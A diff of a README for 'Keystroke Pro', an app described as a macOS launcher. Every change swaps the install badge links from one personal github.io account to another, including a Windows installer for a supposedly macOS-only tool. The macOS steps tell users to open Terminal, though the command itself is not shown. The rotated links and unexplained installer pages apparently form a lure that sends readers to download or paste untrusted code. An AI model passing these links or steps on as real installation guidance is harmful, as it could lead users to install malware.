@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Keystroke Pro](https://img.shields.io/badge/⬇_Install_Keystroke+Pro-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install Keystroke Pro](https://img.shields.io/badge/⬇_Install_Keystroke+Pro-E63946?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -61,9 +61,9 @@ Keystroke Pro is a macOS application launcher and automation tool driven entirel
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://mixedlinkrelease.github.io/installer/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://WalkerCelebrate.github.io/winpkg/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 </div>
 
@@ -81,7 +81,7 @@ Keystroke Pro is a macOS application launcher and automation tool driven entirel
 
 <div align="center">
 
-[![⬇ Install Keystroke Pro](https://img.shields.io/badge/⬇_Install_Keystroke+Pro-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install Keystroke Pro](https://img.shields.io/badge/⬇_Install_Keystroke+Pro-E63946?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
@@ -100,7 +100,7 @@ Keystroke Pro is a macOS application launcher and automation tool driven entirel
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://mixedlinkrelease.github.io/installermac/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://WalkerCelebrate.github.io/macpkg/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -125,7 +125,7 @@ Keystroke Pro is a macOS application launcher and automation tool driven entirel
 
 <div align="center">
 
-[![⬇ Install Keystroke Pro](https://img.shields.io/badge/⬇_Install_Keystroke+Pro-E63946?style=for-the-badge&logo=github)](https://mixedlinkrelease.github.io/installer/)
+[![⬇ Install Keystroke Pro](https://img.shields.io/badge/⬇_Install_Keystroke+Pro-E63946?style=for-the-badge&logo=github)](https://WalkerCelebrate.github.io/winpkg/)
 
 </div>
 
